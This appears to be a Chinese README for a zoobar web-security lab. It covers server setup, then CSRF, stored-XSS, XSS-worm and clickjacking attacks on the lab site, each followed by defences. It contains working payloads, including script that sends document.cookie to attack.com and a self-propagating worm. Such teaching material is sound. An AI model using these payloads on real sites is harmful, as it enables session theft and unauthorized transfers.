# web 安全实践练习项目

web 安全实践实验项目，对其做了一些修改。

**修改内容**

* 支持php7.X 与 8.0.13；
* 对部分类、变量以及html标签的命名做了一些调整。
* 修改部分代码格式；
* 对部分安全性内容进行修改；

> **注**：因为后来对文档做了修改，可能造成与截图的不一致。

---



## 配置与运行

#### php配置

##### php mysql 配置

修改`/etc/php.ini`文件：

* 添加 mysqli 扩展，以支持mysql接口。

  > 在php.ini中添加：`extension mysqli`

其他mysql选项被定义在php.ini中的 `MySQLi` section中，可自行修改：

![image-20211226180342034](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553516.png)

#### httpd/apache服务器配置

以httpd服务器为例子（较新版本的apache服务器）。

```bash
➜  ~ httpd -v       
Server version: Apache/2.4.51 (Unix)
Server built:   Nov 13 2021 20:10:37
```

修改 httpd 服务配置文件`/etc/httpd/conf/httpd.conf 
 `：

* 添加模块：

  ```htaccess
  LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
  ```
  为每个HTTP连接创建一个进程；

* 删除模块（注释掉）：
  
  ```htaccess
  LoadModule mpm_event_module modules/mod_mpm_event.so
  ```
  
  注释掉是因为 httpd 只能有一个多任务模型模块，而PHP是进程安全，但线程不安全的，无法使用 `event` 模块（以多线程方式创建服务）。

新建配置文件`httpd/conf/myconf/zoobar.conf`：

```htaccess
# 添加php模块，将文件移交给php处理后，将生成的html内容返回给客户端浏览器
LoadModule php_module /usr/lib/httpd/modules/libphp.so

<IfModule ssl_module>

    <Directory /files>
        Options Indexes FollowSymLinks
    </Directory>
    
    AddType application/x-httpd-php .php

	# zoobar web服务
	<VirtualHost zoobar.com:443>
		ServerAdmin nishoushun@ustc.edu
		ServerName zoobar.com	

        # 你的项目目录路径
		DocumentRoot /public/www/myzoo

                <IfModule php_module>
                  DirectoryIndex index.html index.htm index.php
                  PHPIniDir /etc/php/php.ini
                </IfModule>

		# 日志记录路径
		ErrorLog  /public/www/myzoo/logs/zoobar_err.log
		CustomLog /public/www/myzoo/logs/access.log combined
	
	</VirtualHost>
</IfModule>

	# attack web服务
	<VirtualHost attack.com:80>
		ServerAdmin nishoushun@ustc.edu
		ServerName attack.com	
        DirectoryIndex index.html index.htm index.php
        
        # 你的项目目录路径
		DocumentRoot /public/www/attack

		# 日志记录路径
		ErrorLog  /public/www/attack/logs/error.log
		CustomLog /public/www/attack/logs/access.log combined
	</VirtualHost>

```

> **注意**：httpd 默认以 `httpd` 用户运行，要注意目录访问权限。

httpd服务器将以 `ServerName` 进行区分发送至本地的请求，如果在本地需要修改hosts文件。（其实可以通过端口号区分，只需要添加 `listen` 指令，并将对应 `VirtualHost` 的端口号进行修改即可）。

将以上配置文件的各项进行相应修改，同时将该配置文件通过 `include` 指令添加进 `/etc/httpd/conf/httpd.conf`中。

> 注意：在某些系统中，php8可能不自带`libphp.so`，需要自行安装，并导入该模块。

##### 数据库配置

1. 配置 mysql 或 mariaDB 数据库。
2. 执行`\sql\create.sql`。

## 项目配置

配置项位于：`项目根目录\includes\config.php`，此文件包含本项目用到的全局变量。

##### 数据库连接部分

修改数据库配置变量

```php
$DEFAULT_DB_NAME = "database schema name";
$DEFAULT_DB_HOST = "database host";
$DEFAULT_DB_PASSWD = "database password";
$DEFAULT_DB_USER = "database user";
```

##### 修改tag以及其他不安全字符过滤规则：

修改`includes\config.php`中的 `$allowd_tags` 以及 `$disallowed`，其中：

* `$allowd_tags`：允许出现在zoobar用户界面中的profile中的html 标签；
* `$disallowd`：不允许出现的字符，会被替换为空格字符：`" "`；
* `$REPLACE_SPACIAL_CHAR`：若为`true`，则将一些特殊字符转义为`&xx`；

##### 开启Transfer安全检查：

修改：

```php
$ENABLE_HTTP_REFER_CHECK = true;
$ENABLE_TOKEN_CHECK = true;
```

* `$ENABLE_HTTP_REFERER_CHECK `：若为 `true` ，则检查请求来源是否为 `/transfer.php`，不通过验证则php终止服务；
* `$ENABLE_TOKEN_CHECK `：若为 `true` ，用户访问 transfer.php 时进行token更新，并于用户提交的token相比较（token被写入到用户表单并不可见），没通过验证则 php 终止服务；

## 攻击演示

用于攻击演示，包含：

* `csrf.html`：包含一段自动提交转帐请求的js。

* `xssCookieGetter.html`：用于存储至zoobar用户的profile中，解析为js后，自动向attack服务的`cooker.php`发送一条请求，包含用户的cookie。

* `cooker.php`：接受请求并打印cookie（实际上没用，要获取cookie，只需要查看 attack.com 的访问日志就可以）：

  ![image-20211221210534047](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553366.png)

* `xssworm.html`：用于存储至zoobar用户的profile中，解析为js后，自动提交转交请求，并提交一个将用户profile 更新为本脚本内容的请求。

* `hijack.html`：点击劫持演示页面

> 注意：
>
> CSRF 攻击演示需要将检查设为 `false`：
>
> ```php
> $ENABLE_HTTP_REFER_CHECK = false;
> $ENABLE_TOKEN_CHECK = false;
> ```
>
> XSS 攻击演示需要将允许的添加一些tag与关键词；
>
> XSS 蠕虫攻击也需要将 CSRF 检查设为 `false`；

### csrf

hacker 在自己的profile中设置：

```html
<a href="http://attack.com/csrf.html">click me to win iphone</a>          
```

浏览器将其解析为html链接：

![image-20211226182515431](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553412.png)

普通用户点击进入 `attack/csrf.html`，js会自动提交一个zoobar转移表单。

理论上可以通过以下代码自动发送一个转帐请求：

```js
const req = new XMLHttpRequest();
req.withCredentials = true;
req.open("POST","https://zoobar.com",false);
req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
req.send("zoobars=1&recipient=hacker&submission=Send");
alert("YOU WIN");
```

> **注意**：设置 `Content-type` 标头：`application/x-www-form-urlencoded` 与 `multipart/form-data` 皆可。（不会还有人不知道两者的区别吧😅）

因为同源策略，httpd服务器会禁止该请求：

![image-20211226182846492](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553392.png)

浏览器会提示 `attack.com` 的 `Access-Control-Allow-Origin` 标头缺失，不允许读取 `zoobar.com` 的资源。

也就是说要访问的网站（attack）需要在响应头部加上 `Access-Control-Allow-Origin` 标头，来告知浏览器是否可以加载 `zoobar.com` 的资源。

可以通过 `*` 来进行模糊匹配，例如下面的标头，都可以通知浏览器允许在 `attack` 域下发起对 `zoobar` 域的请求 ：

* `Access-Control-Allow-Origin:http://zoobar.com`
* `Access-Control-Allow-Origin:*`

当完成这些工作时，理论上应该可以通过纯js发起请求了。（没试过）

[浏览器的同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)

[CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)

可以通过提交表单的方式完成本次攻击：

```bash
<form method="POST"
      action="https://zoobar.com/transfer.php"
      target="it"
      id="transfer-form">

    <!--  默认一个zoobar-->
    <input name="zoobars" type="text" value="1" size="5">
    <input name="recipient" type="text" value="hacker">
    <input type="hidden" name="submission" value="Send">
</form>

<script type="text/javascript">
    // 自动提交表单
    form = document.getElementById("transfer-form");
    form.submit();
    alert("CONGRATULATION!!! YOU WIN")
</script>
```

> 其实去除表单中的`id="transfer-form"` 也会失败，不知道为什么🙃🙃🙃🙃

#### 防御

##### HTTP_REFERER

从日志中可以看出，所有的transfer来源为：`transfer.php`：

```
127.0.0.1 - - [26/Dec/2021:18:40:53 +0800] "POST /transfer.php HTTP/1.1" 200 1874 "https://zoobar.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
```

php可以使用http_referer获取请求来源页面，判定是否为 `/transfer.php`，如果不是则停止服务。

> **注**：http referer 值被保存在http请求报文头中的 `Referer` 字段中

**demo**：

```php
function checkHttpReferer(){
    $request_from = "https://zoobar.com/transfer.php";
    $fromPage = $_SERVER['HTTP_REFERER'];
    if($fromPage == $request_from ){
        return;
    }
    $result = "Transfer failed: post from wrong page.";
    echo $result."<br>";
    // 直接退出
    exit(1);
}
```

但是 HTTP_REFERER 可以被轻松修改，例如使用bp抓取报文，可以轻松修改该值：

![image-20211226184959116](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226184959116.png)

从日志记录可以看出，php将其认为其来源为`https://zoobar.com/transfer.php`：

```bash
127.0.0.1 - - [26/Dec/2021:18:51:16 +0800] "POST /transfer.php HTTP/1.1" 200 1866 "https://zoobar.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
```

通过结果来看攻击也确实成功了。

其实讲到这，可以将上述csrf.html代码修改为以下内容，同样可以达到效果：

```js
<script type="text/javascript">
    const req = new XMLHttpRequest();
    req.withCredentials = true;
    req.open("POST","https://zoobar.com/transfer.php",false);
	// 修改 Referer
    req.setRequestHeader("Referer","https://zoobar.com/transfer.php")
    req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    req.send("zoobars=1&recipient=hacker&submission=Send");
    alert("YOU WIN");
</script>
```

具体代码改动看：`transfer.php`

##### Token

抵御CSRF的办法一般就是找一个只有正常用户知道并可以提交，而hacker是无法得之的值。

每次用户等录页面时，可以生成一个随机值转为token，并保存之session中；之后用户每访问 `transfer.php` 页面，则在表单中自动填入token，并一并发送至服务端，而其他人无法得知该token，也就无法自动提交token信息来完成认证。

> 注意：每次用户logout后要销毁session，防止每次login都用的同一个token
>
> 要将`"Content-type"`设为`"application/x-www-form-urlencoded"`以便于服务端识别POST参数。

具体代码改动看：`transfer.php` 与 `userAuth.php#UserAuth#logout`

### XSS注入

#### 存储型

##### cookie窃取

xsser将以下代码存储在profile中：

```js
<h1>HEllO-+___++___+</h1>

<script>
  window.open("http://attack.com/cooker.php?cookie="+document.cookie)
</script>
```

普通用户点击后自动发送一个包含本页面cookie的请求至攻击者页面。

在attack.com网站的日志记录中可以看到,cookie被窃取：

```bash
127.0.0.1 - - [26/Dec/2021:20:16:16 +0800] "GET /cooker.php?cookie=PHPSESSID=t4bjul4eclvpib482fu3vitg7h;%20ZoobarLogin=YToyOntpOjA7czo1OiJ4c3NlciI7aToxO3M6MzI6ImQ5MDZhYzcwY2M0NmQ5MGZmODUzNjg3NDg1NDg5NDJjIjt9 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"

```

##### XSS蠕虫

普通用户访问hacker的页面并触发js，该js进行攻击，并将本身代码写入到被攻击者的页面中并被存储。其他人访问该页面同样遭到xss攻击。

在xssworm.html中：

```html
<!--xss 蠕虫，将其存入user profile中生效-->
<span id="xssworm-span">
    <script>
        xmlhttp=new XMLHttpRequest();
        xmlhttp.open("POST","https://zoobar.com/transfer.php",false);
        req.setRequestHeader("Referer","https://zoobar.com/transfer.php")
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        // 提交请求，为 xsswormer 转一个zoobar
        xmlhttp.send("zoobars=1&recipient=xsswormer&submission=Send");

        // 提交profile更新请求
        xmlhttp=new XMLHttpRequest();
        xmlhttp.open("POST","https://zoobar.com/index.php",true);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        // 读取本块元素内容 ==> str
        str = "<span id=xssworm-span>"
        str += document.getElementById("xssworm-span").innerHTML + "</span>";
        str = encodeURIComponent(str);
        // 将其保存至被攻击者的 profile中
        str = "profile_submit=Save&profile_update=" + str;
        xmlhttp.send(str);
    </script>
</span>
```

该代码首先发送一个转移请求，然后读取代码内容（连带标签）发送一个 profile 更新请求。

#### 防御

##### 针对  Cookie 窃取

当服务端响应报文中的 `Set-Cookie` 标头包含 `httponly` 时，它是不能被 `document.cookie` 所获取的，而zoobar 中貌似只有设置 `PHPSESSION` 时，用到了 `Cookie` ，所以可以在配置文件中添加：

```ini
 session.cookie_httponly = 1
```

或者在代码中添加：

```php
ini_set("session.cookie_httponly", 1);
```

来让存储 SESSION ID 的 Cookie 添加上 `httponly` 属性。 

如果涉及到cookie的设置：，可以参考：https://secure.php.net/manual/en/function.setcookie.php

##### 针对关键词的替换

在输出html时，仅使用信任的tag，对一些可能有威胁的标tag符或标签进行替换。

> 比如使用 `&lt;` 替换 `<`

**demo**：

```php
$profile = preg_replace("/</i", "&lt", $profile);
$profile = preg_replace("/>/i", "&gt", $profile);
```

其实php中提供了该功能函数 `htmlentities($string)`，该函数将特殊字符转义为实体字符，从而并不会被浏览器解析为tag 。

![image-20211226200748929](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553445.png)

> **注**：字符转移总是应该在输出时进行。

具体代码改动看：`users.php`

##### 黑\白名单

用正则表达式匹配，不允许/只允许

### 点击劫持

通过`iframe`在其他网站中包含zoobar transfer.php页面，利用css将iframe内容调成透明，并且诱导用户在`Send` 按钮的位置点击。

> 由于是iframe引入transfer.php界面，所以用户点击了按钮后的效果与在zoobar网站上点击效果完全一致。

hijacker在自己的profile中添加：

```html
<a href="http://attack.com/hijack.html">win</a>    
```

用户点击进入后会看到（为了方便演示，此时的透明度为50%）：

![image-20211226204019788](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226204019788.png)

用户只需要向`win`的位置进行点击，即用户自己点击了send按钮。

> 但实际上表单中并没有内容，此次攻击无效🙃🙃🙃🙃🙃，要自己去慢慢调整网页...

#### 防御

##### X-Frame-Options

The **`X-Frame-Options`** HTTP 响应头是用来给浏览器指示允许一个页面可否在 `<frame>`，`<iframe>` ，`<embed>`，`<object>`，中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免 clickhjacking 攻击。

`X-Frame-Options` 有三个可能的值：

* `deny`:表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。

* `sameorigin`：表示该页面可以在相同域名页面的 frame 中展示。

* `allow-from *uri*`：表示该页面可以在指定来源的 frame 中展示。

```
X-Frame-Options: deny
X-Frame-Options: sameorigin
X-Frame-Options: allow-from https://example.com/
```

检查httpd配置中是否包含headers模块，没有就导入进来：

```htaccess
LoadModule headers_module modules/mod_headers.so
```

在自定义配置文件中添加，来让httpd服务器发起的响应中，总是添加该头部：

```htaccess
<IfModule headers_module>
    Header always set X-Frame-Options "sameorigin"
</IfModule>
```

![image-20211226210721233](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226210721233.png)

关于X-Frame-Options可以参考 [X-Frame-Options](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options)
